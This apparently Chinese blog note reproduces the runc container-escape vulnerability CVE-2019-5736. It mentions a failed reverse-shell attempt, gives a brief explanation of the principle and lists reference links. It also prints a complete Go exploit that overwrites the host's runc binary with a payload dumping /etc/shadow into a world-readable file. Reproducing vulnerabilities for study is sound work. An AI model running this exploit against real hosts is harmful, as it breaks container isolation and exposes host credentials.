# Docker逃逸系列4 runc漏洞逃逸








kali上接收不到反弹shell，怎么回事(successfully got write handle {address} 这里并没有显示出来，执行到这里卡住了？)

```go
package main

// Implementation of CVE-2019-5736
// Created with help from @singe, @_cablethief, and @feexd.
// This commit also helped a ton to understand the vuln
// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d
import (
	"fmt"
	"io/ioutil"
	"os"
	"strconv"
	"strings"
)

// This is the line of shell commands that will execute on the host
var payload = "#!/bin/bash \n cat /etc/shadow > /tmp/shadow && chmod 777 /tmp/shadow"

func main() {
	// First we overwrite /bin/sh with the /proc/self/exe interpreter path
	fd, err := os.Create("/bin/sh")
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Fprintln(fd, "#!/proc/self/exe")
	err = fd.Close()
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("[+] Overwritten /bin/sh successfully")

	// Loop through all processes to find one whose cmdline includes runcinit
	// This will be the process created by runc
	var found int
	for found == 0 {
		pids, err := ioutil.ReadDir("/proc")
		if err != nil {
			fmt.Println(err)
			return
		}
		for _, f := range pids {
			fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
			fstring := string(fbytes)
			if strings.Contains(fstring, "runc") {
				fmt.Println("[+] Found the PID:", f.Name())
				found, err = strconv.Atoi(f.Name())
				if err != nil {
					fmt.Println(err)
					return
				}
			}
		}
	}

	// We will use the pid to get a file handle for runc on the host.
	var handleFd = -1
	for handleFd == -1 {
		// Note, you do not need to use the O_PATH flag for the exploit to work.
		handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)
		if int(handle.Fd()) > 0 {
			handleFd = int(handle.Fd())
		}
	}
	fmt.Println("[+] Successfully got the file handle")

	// Now that we have the file handle, lets write to the runc binary and overwrite it
	// It will maintain it's executable flag
	for {
		writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)
		if int(writeHandle.Fd()) > 0 {
			fmt.Println("[+] Successfully got write handle", writeHandle)
			writeHandle.Write([]byte(payload))
			return
		}
	}
}

```



### 原理分析：

- 修改容器内的`/bin/sh`文件，改为`#!/proc/self/exe`，这样的话，当容器内的`/bin/sh`被执行的时候，实际上被执行的文件路径是`/proc/self/exe`
- `/proc/self/exe`是内核为每个进程创建的符号链接，指向**为该进程而执行的二进制文件**。当容器中的`/bin/sh`被执行时，`/proc/self/exe`指向的宿主机上的`runc`就会被执行
- 

## 参考链接

- [复现参考1](https://cloud.tencent.com/developer/article/1668009?from=information.detail.docker%20%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0)
- [复现参考2](https://www.freebuf.com/articles/web/258398.html)
- [PoC代码地址](https://github.com/Frichetten/CVE-2019-5736-PoC)
- [https://kubernetes.io/blog/2019/02/11/runc-and-cve-2019-5736/#what-is-the-vulnerability](https://kubernetes.io/blog/2019/02/11/runc-and-cve-2019-5736/#what-is-the-vulnerability)
- 
